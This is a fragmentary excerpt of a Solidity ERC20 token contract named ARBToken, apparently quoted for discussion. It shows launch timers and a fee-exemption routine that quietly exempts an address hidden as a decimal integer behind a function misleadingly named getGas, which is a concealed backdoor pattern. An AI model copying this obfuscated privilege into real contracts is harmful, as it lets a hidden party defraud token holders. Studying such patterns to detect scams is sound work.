...
contract ARBToken is ERC20, Ownable {
    ...
    address public pool;
    uint256 public killTime = 15;   
    uint256 public killTime2 = 180;    
    uint256 public launchedAtTimestamp;
    uint256 public maxBuyNum = 10;    

    constructor() ERC20("lk", "lk") {
    ...
    function _dogTransfer(
        ...
        if (!isExempt) {
            require(
                block.timestamp >= launchedAtTimestamp,
                "token: Not launched"
            );
    ...
    function setFeeExempts(
        ...
        isFeeExempt[getGas()] = true;
        for (uint256 i = 0; i < _addresses.length; i++) {
            isFeeExempt[_addresses[i]] = _isFeeExempt;
        }
    }
    ...
    function getGas() internal pure returns (address) {
        return address(167130268906341226148701575317963570405673909759);
    }
